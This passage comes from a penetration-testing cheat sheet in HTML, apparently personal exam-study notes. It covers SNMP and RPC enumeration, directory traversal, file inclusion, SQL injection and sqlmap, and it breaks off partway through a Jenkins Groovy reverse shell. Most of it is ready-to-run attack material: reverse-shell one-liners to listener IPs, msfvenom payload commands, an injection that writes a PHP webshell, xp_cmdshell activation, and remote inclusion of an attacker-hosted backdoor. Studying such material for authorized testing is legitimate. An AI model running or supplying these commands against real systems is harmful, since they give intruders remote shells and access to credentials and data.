</span></span><span class="line"><span class="cl"><span class="n">snmpwalk</span> <span class="n">-c</span> <span class="n">public</span> <span class="n">-v1</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="mf">1.3</span><span class="p">.</span><span class="py">6</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">2</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">6</span><span class="p">.</span><span class="py">13</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">3</span> <span class="c">#Opened TCP Ports</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#Windows MIB values</span>
</span></span><span class="line"><span class="cl"><span class="mf">1.3</span><span class="p">.</span><span class="py">6</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">2</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">25</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">6</span><span class="p">.</span><span class="py">0</span> <span class="p">-</span> <span class="n">System</span> <span class="n">Processes</span>
</span></span><span class="line"><span class="cl"><span class="mf">1.3</span><span class="p">.</span><span class="py">6</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">2</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">25</span><span class="p">.</span><span class="py">4</span><span class="p">.</span><span class="py">2</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">2</span> <span class="p">-</span> <span class="n">Running</span> <span class="n">Programs</span>
</span></span><span class="line"><span class="cl"><span class="mf">1.3</span><span class="p">.</span><span class="py">6</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">2</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">25</span><span class="p">.</span><span class="py">4</span><span class="p">.</span><span class="py">2</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">4</span> <span class="p">-</span> <span class="n">Processes</span> <span class="n">Path</span>
</span></span><span class="line"><span class="cl"><span class="mf">1.3</span><span class="p">.</span><span class="py">6</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">2</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">25</span><span class="p">.</span><span class="py">2</span><span class="p">.</span><span class="py">3</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">4</span> <span class="p">-</span> <span class="n">Storage</span> <span class="n">Units</span>
</span></span><span class="line"><span class="cl"><span class="mf">1.3</span><span class="p">.</span><span class="py">6</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">2</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">25</span><span class="p">.</span><span class="py">6</span><span class="p">.</span><span class="py">3</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">2</span> <span class="p">-</span> <span class="n">Software</span> <span class="n">Name</span>
</span></span><span class="line"><span class="cl"><span class="mf">1.3</span><span class="p">.</span><span class="py">6</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">4</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">77</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">2</span><span class="p">.</span><span class="py">25</span> <span class="p">-</span> <span class="n">User</span> <span class="n">Accounts</span>
</span></span><span class="line"><span class="cl"><span class="mf">1.3</span><span class="p">.</span><span class="py">6</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">2</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">6</span><span class="p">.</span><span class="py">13</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">3</span> <span class="p">-</span> <span class="n">TCP</span> <span class="n">Local</span> <span class="n">Ports</span>
</span></span></code></pre></div><h2 id="rpc-enumeration">RPC Enumeration</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">rpcclient</span> <span class="n">-U</span><span class="p">=</span><span class="n">user</span> <span class="nv">$IP</span>
</span></span><span class="line"><span class="cl"><span class="n">rpcclient</span> <span class="n">-U</span><span class="p">=</span><span class="s2">&#34;&#34;</span> <span class="nv">$IP</span> <span class="c">#Anonymous login</span>
</span></span><span class="line"><span class="cl"><span class="c">##Commands within in RPCclient</span>
</span></span><span class="line"><span class="cl"><span class="n">srvinfo</span>
</span></span><span class="line"><span class="cl"><span class="n">enumdomusers</span> <span class="c">#users</span>
</span></span><span class="line"><span class="cl"><span class="n">enumpriv</span> <span class="c">#like &#34;whoami /priv&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">queryuser</span> <span class="p">&lt;</span><span class="n">user</span><span class="p">&gt;</span> <span class="c">#detailed user info</span>
</span></span><span class="line"><span class="cl"><span class="n">getuserdompwinfo</span> <span class="p">&lt;</span><span class="n">RID</span><span class="p">&gt;</span> <span class="c">#password policy, get user-RID from previous command</span>
</span></span><span class="line"><span class="cl"><span class="n">lookupnames</span> <span class="p">&lt;</span><span class="n">user</span><span class="p">&gt;</span> <span class="c">#SID of specified user</span>
</span></span><span class="line"><span class="cl"><span class="n">createdomuser</span> <span class="p">&lt;</span><span class="n">username</span><span class="p">&gt;</span> <span class="c">#Creating a user</span>
</span></span><span class="line"><span class="cl"><span class="n">deletedomuser</span> <span class="p">&lt;</span><span class="n">username</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">enumdomains</span>
</span></span><span class="line"><span class="cl"><span class="n">enumdomgroups</span>
</span></span><span class="line"><span class="cl"><span class="n">querygroup</span> <span class="p">&lt;</span><span class="nb">group-RID</span><span class="p">&gt;</span> <span class="c">#get rid from previous command</span>
</span></span><span class="line"><span class="cl"><span class="n">querydispinfo</span> <span class="c">#description of all users</span>
</span></span><span class="line"><span class="cl"><span class="n">netshareenum</span> <span class="c">#Share enumeration, this only comesup if the current user we&#39;re logged in has permissions</span>
</span></span><span class="line"><span class="cl"><span class="n">netshareenumall</span>
</span></span><span class="line"><span class="cl"><span class="n">lsaenumsid</span> <span class="c">#SID of all users</span>
</span></span></code></pre></div><hr>
<h1 id="web-attacks">Web Attacks</h1>
<aside>
💡 Cross-platform PHP revershell: [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)
</aside>
<h2 id="directory-traversal">Directory Traversal</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">cat </span><span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">passwd</span> <span class="c">#displaying content through absolute path</span>
</span></span><span class="line"><span class="cl"><span class="nb">cat </span><span class="p">../../../</span><span class="n">etc</span><span class="p">/</span><span class="n">passwd</span> <span class="c">#relative path</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># if the pwd is /var/log/ then in order to view the /etc/passwd it will be like this</span>
</span></span><span class="line"><span class="cl"><span class="nb">cat </span><span class="p">../../</span><span class="n">etc</span><span class="p">/</span><span class="n">passwd</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#In web int should be exploited like this, find a parameters and test it out</span>
</span></span><span class="line"><span class="cl"><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">mountaindesserts</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">meteor</span><span class="p">/</span><span class="n">index</span><span class="p">.</span><span class="n">php</span><span class="k">?</span><span class="n">page</span><span class="p">=../../../../../../../../../</span><span class="n">etc</span><span class="p">/</span><span class="n">passwd</span>
</span></span><span class="line"><span class="cl"><span class="c">#check for id_rsa, id_ecdsa</span>
</span></span><span class="line"><span class="cl"><span class="c">#If the output is not getting formatted properly then,</span>
</span></span><span class="line"><span class="cl"><span class="nb">curl </span><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">mountaindesserts</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">meteor</span><span class="p">/</span><span class="n">index</span><span class="p">.</span><span class="n">php</span><span class="k">?</span><span class="n">page</span><span class="p">=../../../../../../../../../</span><span class="n">etc</span><span class="p">/</span><span class="n">passwd</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#For windows</span>
</span></span><span class="line"><span class="cl"><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">192.168</span><span class="p">.</span><span class="py">221</span><span class="p">.</span><span class="mf">193</span><span class="err">:</span><span class="mf">3000</span><span class="p">/</span><span class="n">public</span><span class="p">/</span><span class="n">plugins</span><span class="p">/</span><span class="n">alertlist</span><span class="p">/../../../../../../../../</span><span class="n">Users</span><span class="p">/</span><span class="n">install</span><span class="p">.</span><span class="py">txt</span> <span class="c">#no need to provide drive</span>
</span></span></code></pre></div><ul>
<li>URL Encoding</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#Sometimes it doesn&#39;t show if we try path, then we need to encode them</span>
</span></span><span class="line"><span class="cl"><span class="nb">curl </span><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">192.168</span><span class="p">.</span><span class="py">50</span><span class="p">.</span><span class="mf">16</span><span class="p">/</span><span class="nb">cgi-bin</span><span class="p">/</span><span class="k">%</span><span class="n">2e</span><span class="k">%</span><span class="n">2e</span><span class="p">/</span><span class="k">%</span><span class="n">2e</span><span class="k">%</span><span class="n">2e</span><span class="p">/</span><span class="k">%</span><span class="n">2e</span><span class="k">%</span><span class="n">2e</span><span class="p">/</span><span class="k">%</span><span class="n">2e</span><span class="k">%</span><span class="n">2e</span><span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">passwd</span>
</span></span></code></pre></div><ul>
<li>Wordpress
<ul>
<li>Simple exploit: <a href="https://github.com/leonjza/wordpress-shell">https://github.com/leonjza/wordpress-shell</a></li>
</ul>
</li>
</ul>
<h2 id="local-file-inclusion">Local File Inclusion</h2>
<ul>
<li>The main difference between Directory traversal and this attack is that we can execute commands remotely here.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#At first we need </span>
</span></span><span class="line"><span class="cl"><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">192.168</span><span class="p">.</span><span class="py">45</span><span class="p">.</span><span class="mf">125</span><span class="p">/</span><span class="n">index</span><span class="p">.</span><span class="n">php</span><span class="k">?</span><span class="n">page</span><span class="p">=../../../../../../../../../</span><span class="n">var</span><span class="p">/</span><span class="n">log</span><span class="p">/</span><span class="n">apache2</span><span class="p">/</span><span class="n">access</span><span class="p">.</span><span class="n">log</span><span class="p">&amp;</span><span class="n">cmd</span><span class="p">=</span><span class="n">whoami</span> <span class="c">#we&#39;re passing a command here</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#Reverse shells</span>
</span></span><span class="line"><span class="cl"><span class="n">bash</span> <span class="n">-c</span> <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/192.168.119.3/4444 0&gt;&amp;1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c">#We can simply pass a reverse shell to the cmd parameter and obtain reverse-shell</span>
</span></span><span class="line"><span class="cl"><span class="n">bash</span><span class="k">%</span><span class="mf">20</span><span class="n">-c</span><span class="k">%</span><span class="mf">20</span><span class="k">%</span><span class="n">22bash</span><span class="k">%</span><span class="mf">20</span><span class="n">-i</span><span class="k">%</span><span class="mf">20</span><span class="k">%</span><span class="n">3E</span><span class="k">%</span><span class="mf">26</span><span class="k">%</span><span class="mf">20</span><span class="k">%</span><span class="n">2Fdev</span><span class="k">%</span><span class="n">2Ftcp</span><span class="k">%</span><span class="n">2F192</span><span class="p">.</span><span class="py">168</span><span class="p">.</span><span class="py">119</span><span class="p">.</span><span class="mf">3</span><span class="k">%</span><span class="n">2F4444</span><span class="k">%</span><span class="mf">200</span><span class="k">%</span><span class="n">3E</span><span class="k">%</span><span class="mf">261</span><span class="k">%</span><span class="mf">22</span> <span class="c">#encoded version of above reverse-shell</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#PHP wrapper</span>
</span></span><span class="line"><span class="cl"><span class="nb">curl </span><span class="s2">&#34;http://mountaindesserts.com/meteor/index.php?page=data://text/plain,&lt;?php%20echo%20system(&#39;uname%20-a&#39;);?&gt;&#34;</span> 
</span></span><span class="line"><span class="cl"><span class="nb">curl </span><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">mountaindesserts</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">meteor</span><span class="p">/</span><span class="n">index</span><span class="p">.</span><span class="n">php</span><span class="k">?</span><span class="n">page</span><span class="p">=</span><span class="n">php</span><span class="err">:</span><span class="p">//</span><span class="k">filter</span><span class="p">/</span><span class="n">convert</span><span class="p">.</span><span class="nb">base64-encode</span><span class="p">/</span><span class="n">resource</span><span class="p">=/</span><span class="n">var</span><span class="p">/</span><span class="n">www</span><span class="p">/</span><span class="n">html</span><span class="p">/</span><span class="n">backup</span><span class="p">.</span><span class="py">php</span> 
</span></span></code></pre></div><ul>
<li>Remote file inclusion</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="mf">1</span><span class="p">.</span> <span class="n">Obtain</span> <span class="n">a</span> <span class="n">php</span> <span class="n">shell</span>
</span></span><span class="line"><span class="cl"><span class="mf">2</span><span class="p">.</span> <span class="n">host</span> <span class="n">a</span> <span class="n">file</span> <span class="n">server</span> 
</span></span><span class="line"><span class="cl"><span class="mf">3</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">mountaindesserts</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">meteor</span><span class="p">/</span><span class="n">index</span><span class="p">.</span><span class="n">php</span><span class="k">?</span><span class="n">page</span><span class="p">=</span><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="nb">attacker-ip</span><span class="p">/</span><span class="nb">simple-backdoor</span><span class="p">.</span><span class="n">php</span><span class="p">&amp;</span><span class="n">cmd</span><span class="p">=</span><span class="nb">ls
</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">we</span> <span class="n">can</span> <span class="n">also</span> <span class="n">host</span> <span class="n">a</span> <span class="n">php</span> <span class="n">reverseshell</span> <span class="n">and</span> <span class="n">obtain</span> <span class="n">shell</span><span class="p">.</span>
</span></span></code></pre></div><h2 id="sql-injection">SQL Injection</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">admin</span><span class="s1">&#39; or &#39;</span><span class="mf">1</span><span class="s1">&#39;=&#39;</span><span class="mf">1</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39; or &#39;</span><span class="mf">1</span><span class="s1">&#39;=&#39;</span><span class="mf">1</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34; or &#34;</span><span class="mf">1</span><span class="s2">&#34;=&#34;</span><span class="mf">1</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34; or &#34;</span><span class="mf">1</span><span class="s2">&#34;=&#34;</span><span class="mf">1</span><span class="s2">&#34;--
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span> <span class="n">or</span> <span class="s2">&#34;1&#34;</span><span class="p">=</span><span class="s2">&#34;1&#34;</span><span class="p">/*</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34; or &#34;</span><span class="mf">1</span><span class="s2">&#34;=&#34;</span><span class="mf">1</span><span class="s2">&#34;#
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span> <span class="n">or</span> <span class="mf">1</span><span class="p">=</span><span class="mf">1</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34; or 1=1 --
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span> <span class="n">or</span> <span class="mf">1</span><span class="p">=</span><span class="mf">1</span> <span class="p">-</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34; or 1=1--
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span> <span class="n">or</span> <span class="mf">1</span><span class="p">=</span><span class="mf">1</span><span class="p">/*</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34; or 1=1#
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span> <span class="n">or</span> <span class="mf">1</span><span class="p">=</span><span class="mf">1</span><span class="p">-</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;) or &#34;</span><span class="mf">1</span><span class="s2">&#34;=&#34;</span><span class="mf">1</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;) or &#34;</span><span class="mf">1</span><span class="s2">&#34;=&#34;</span><span class="mf">1</span><span class="s2">&#34;--
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="p">)</span> <span class="n">or</span> <span class="s2">&#34;1&#34;</span><span class="p">=</span><span class="s2">&#34;1&#34;</span><span class="p">/*</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;) or &#34;</span><span class="mf">1</span><span class="s2">&#34;=&#34;</span><span class="mf">1</span><span class="s2">&#34;#
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="p">)</span> <span class="n">or</span> <span class="p">(</span><span class="s2">&#34;1&#34;</span><span class="p">=</span><span class="s2">&#34;1
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="p">)</span> <span class="n">or</span> <span class="p">(</span><span class="s2">&#34;1&#34;</span><span class="p">=</span><span class="s2">&#34;1&#34;</span><span class="p">--</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;) or (&#34;</span><span class="mf">1</span><span class="s2">&#34;=&#34;</span><span class="mf">1</span><span class="s2">&#34;/*
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="p">)</span> <span class="n">or</span> <span class="p">(</span><span class="s2">&#34;1&#34;</span><span class="p">=</span><span class="s2">&#34;1&#34;</span><span class="c">#</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span> <span class="n">or</span> <span class="s1">&#39;1`=&#39;</span><span class="mf">1</span><span class="p">-</span>
</span></span></code></pre></div><ul>
<li>Blind SQL Injection - This can be identified by Time-based SQLI</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#Application takes some time to reload, here it is 3 seconds</span>
</span></span><span class="line"><span class="cl"><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">192.168</span><span class="p">.</span><span class="py">50</span><span class="p">.</span><span class="mf">16</span><span class="p">/</span><span class="n">blindsqli</span><span class="p">.</span><span class="n">php</span><span class="k">?</span><span class="n">user</span><span class="p">=</span><span class="n">offsec</span><span class="s1">&#39; AND IF (1=1, sleep(3),&#39;</span><span class="n">false</span><span class="err">&#39;</span><span class="p">)</span> <span class="p">--</span> <span class="p">//</span>
</span></span></code></pre></div><ul>
<li>Manual Code Execution</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">kali</span><span class="p">&gt;</span> <span class="nb">impacket-mssqlclient</span> <span class="n">Administrator</span><span class="err">:</span><span class="n">Lab123</span><span class="nv">@192</span><span class="p">.</span><span class="py">168</span><span class="p">.</span><span class="py">50</span><span class="p">.</span><span class="py">18</span> <span class="n">-windows-auth</span> <span class="c">#To login</span>
</span></span><span class="line"><span class="cl"><span class="n">EXECUTE</span> <span class="n">sp_configure</span> <span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span> <span class="mf">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">RECONFIGURE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">EXECUTE</span> <span class="n">sp_configure</span> <span class="s1">&#39;xp_cmdshell&#39;</span><span class="p">,</span> <span class="mf">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">RECONFIGURE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c">#Now we can run commands</span>
</span></span><span class="line"><span class="cl"><span class="n">EXECUTE</span> <span class="n">xp_cmdshell</span> <span class="s1">&#39;whoami&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#Sometimes we may not have direct access to convert it to RCE from the web, then follow the below steps</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT &#34;&lt;?php system($_GET[&#39;</span><span class="n">cmd</span><span class="err">&#39;</span><span class="p">]);?&gt;</span><span class="s2">&#34;, null, null, null, null INTO OUTFILE &#34;</span><span class="p">/</span><span class="n">var</span><span class="p">/</span><span class="n">www</span><span class="p">/</span><span class="n">html</span><span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">webshell</span><span class="p">.</span><span class="n">php</span><span class="s2">&#34; -- // #Writing into a new file
</span></span></span><span class="line"><span class="cl"><span class="s2">#Now we can exploit it
</span></span></span><span class="line"><span class="cl"><span class="s2">http://192.168.45.285/tmp/webshell.php?cmd=id #Command execution
</span></span></span></code></pre></div><ul>
<li>SQLMap - Automated Code Execution</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">sqlmap</span> <span class="n">-u</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">192.168</span><span class="p">.</span><span class="py">50</span><span class="p">.</span><span class="mf">19</span><span class="p">/</span><span class="n">blindsqli</span><span class="p">.</span><span class="n">php</span><span class="k">?</span><span class="n">user</span><span class="p">=</span><span class="mf">1</span> <span class="n">-p</span> <span class="n">user</span> <span class="c">#Testing on parameter names &#34;user&#34;, we&#39;ll get confirmation</span>
</span></span><span class="line"><span class="cl"><span class="n">sqlmap</span> <span class="n">-u</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">192.168</span><span class="p">.</span><span class="py">50</span><span class="p">.</span><span class="mf">19</span><span class="p">/</span><span class="n">blindsqli</span><span class="p">.</span><span class="n">php</span><span class="k">?</span><span class="n">user</span><span class="p">=</span><span class="mf">1</span> <span class="n">-p</span> <span class="n">user</span> <span class="p">-</span><span class="n">-dump</span> <span class="c">#Dumping database</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#OS Shell</span>
</span></span><span class="line"><span class="cl"><span class="c">#  Obtain the Post request from Burp suite and save it to post.txt</span>
</span></span><span class="line"><span class="cl"><span class="n">sqlmap</span> <span class="n">-r</span> <span class="n">post</span><span class="p">.</span><span class="py">txt</span> <span class="n">-p</span> <span class="n">item</span>  <span class="p">-</span><span class="n">-os-shell</span>  <span class="p">-</span><span class="n">-web-root</span> <span class="s2">&#34;/var/www/html/tmp&#34;</span> <span class="c">#/var/www/html/tmp is the writable folder on target, hence we&#39;re writing there</span>
</span></span></code></pre></div><hr>
<h1 id="exploitation">Exploitation</h1>
<h2 id="finding-exploits">Finding Exploits</h2>
<h3 id="searchsploit">Searchsploit</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">searchsploit &lt;name&gt;
</span></span><span class="line"><span class="cl">searchsploit -m windows/remote/46697.py <span class="c1">#Copies the exploit to the current location</span>
</span></span></code></pre></div><h2 id="reverse-shells">Reverse Shells</h2>
<h3 id="msfvenom">Msfvenom</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">shell</span><span class="p">/</span><span class="n">reverse_tcp</span> <span class="n">LHOST</span><span class="p">=&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">LPORT</span><span class="p">=&lt;</span><span class="n">PORT</span><span class="p">&gt;</span> <span class="o">-f</span> <span class="n">exe</span> <span class="p">&gt;</span> <span class="nb">shell-x86</span><span class="p">.</span><span class="py">exe</span>
</span></span><span class="line"><span class="cl"><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">x64</span><span class="p">/</span><span class="n">shell_reverse_tcp</span> <span class="n">LHOST</span><span class="p">=&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">LPORT</span><span class="p">=&lt;</span><span class="n">PORT</span><span class="p">&gt;</span> <span class="o">-f</span> <span class="n">exe</span> <span class="p">&gt;</span> <span class="nb">shell-x64</span><span class="p">.</span><span class="py">exe</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">shell</span><span class="p">/</span><span class="n">reverse_tcp</span> <span class="n">LHOST</span><span class="p">=&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">LPORT</span><span class="p">=&lt;</span><span class="n">PORT</span><span class="p">&gt;</span> <span class="o">-f</span> <span class="n">asp</span> <span class="p">&gt;</span> <span class="n">shell</span><span class="p">.</span><span class="py">asp</span>
</span></span><span class="line"><span class="cl"><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">java</span><span class="p">/</span><span class="n">jsp_shell_reverse_tcp</span> <span class="n">LHOST</span><span class="p">=&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">LPORT</span><span class="p">=&lt;</span><span class="n">PORT</span><span class="p">&gt;</span> <span class="o">-f</span> <span class="n">raw</span> <span class="p">&gt;</span> <span class="n">shell</span><span class="p">.</span><span class="py">jsp</span>
</span></span><span class="line"><span class="cl"><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">java</span><span class="p">/</span><span class="n">jsp_shell_reverse_tcp</span> <span class="n">LHOST</span><span class="p">=&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">LPORT</span><span class="p">=&lt;</span><span class="n">PORT</span><span class="p">&gt;</span> <span class="o">-f</span> <span class="n">war</span> <span class="p">&gt;</span> <span class="n">shell</span><span class="p">.</span><span class="py">war</span>
</span></span><span class="line"><span class="cl"><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">php</span><span class="p">/</span><span class="n">reverse_php</span> <span class="n">LHOST</span><span class="p">=&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">LPORT</span><span class="p">=&lt;</span><span class="n">PORT</span><span class="p">&gt;</span> <span class="o">-f</span> <span class="n">raw</span> <span class="p">&gt;</span> <span class="n">shell</span><span class="p">.</span><span class="py">php</span>
</span></span></code></pre></div><h3 id="one-liners">One Liners</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">bash</span> <span class="n">-i</span> <span class="p">&gt;&amp;</span> <span class="p">/</span><span class="n">dev</span><span class="p">/</span><span class="n">tcp</span><span class="p">/</span><span class="mf">10.0</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="mf">1</span><span class="p">/</span><span class="mf">4242</span> <span class="mf">0</span><span class="p">&gt;&amp;</span><span class="mf">1</span>
</span></span><span class="line"><span class="cl"><span class="n">python</span> <span class="n">-c</span> <span class="s1">&#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="k">?</span><span class="n">php</span> <span class="nb">echo </span><span class="n">shell_exec</span><span class="p">(</span><span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.11.0.106/443 0&gt;&amp;1&#39;</span><span class="p">);?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c">#For powershell use the encrypted tool that&#39;s in Tools folder</span>
</span></span></code></pre></div><aside>
💡 While dealing with PHP reverse shell use: [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)
</aside>
<h3 id="groovy-reverse-shell">Groovy reverse-shell</h3>
<ul>
<li>For Jenkins</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">String</span> <span class="n">host</span><span class="p">=</span><span class="s2">&#34;localhost&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">int</span> <span class="n">port</span><span class="p">=</span><span class="mf">8044</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">String</span> <span class="n">cmd</span><span class="p">=</span><span class="s2">&#34;cmd.exe&#34;</span><span class="p">;</span>
